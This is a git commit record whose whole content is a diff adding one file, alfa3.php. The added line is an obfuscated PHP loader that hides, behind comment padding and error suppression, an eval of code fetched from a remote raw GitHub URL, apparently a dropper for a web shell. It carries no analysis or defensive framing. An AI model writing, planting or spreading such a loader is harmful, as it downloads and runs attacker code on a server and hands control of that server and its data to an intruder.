e52d89b46bafcf47354599e7504c376b511324a5
zivanaoktora <142502775+zivanaoktora@users.noreply.github.com>
2024-03-22 12:42:33 +0700

    alfa3.php

---
+++ alfa3.php
@@ -0,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/alfa2.php"))/******/ /*By Ninja Jago*/?>
